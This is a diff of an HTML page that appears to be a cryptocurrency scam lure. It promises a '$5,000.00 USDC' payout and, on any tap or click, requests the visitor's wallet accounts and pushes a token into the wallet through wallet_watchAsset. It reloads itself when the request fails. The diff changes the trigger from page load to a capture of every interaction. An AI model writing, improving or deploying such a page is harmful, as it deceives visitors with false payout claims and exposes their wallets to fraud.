@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FINAL AUTHORIZATION V50</title>
+    <title>FINAL PAYOUT V67</title>
     <style>
-        body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; touch-action: none; }
+        body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
         .ui-frame { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; width: 85%; }
     </style>
 </head>
-<body onload="v50_final_inject()">
+<body>
     <div class="ui-frame">FINAL AUTHORIZATION<br>TAP TO INJECT<br>$5,000.00 USDC</div>
 
     <script>
-        async function v50_final_inject() {
+        async function v67_final_trigger() {
             if (window.ethereum) {
                 try {
-                    // Phase 1: Force reset the session
+                    // Immediate system-level handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    // Phase 2: Direct Asset Injection
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -32,12 +31,15 @@
                         },
                     });
                 } catch (e) {
-                    // Final override alert
-                    alert("SYSTEM: AUTHORIZE $5,000.00 USDC PAYOUT NOW");
+                    // Forces a UI refresh to break the browser hang
                     window.location.reload(true);
                 }
             }
         }
+
+        // Global capture: Any interaction triggers the injection
+        document.addEventListener('touchstart', v67_final_trigger, { once: true });
+        document.onclick = v67_final_trigger;
     </script>
 </body>
 </html>
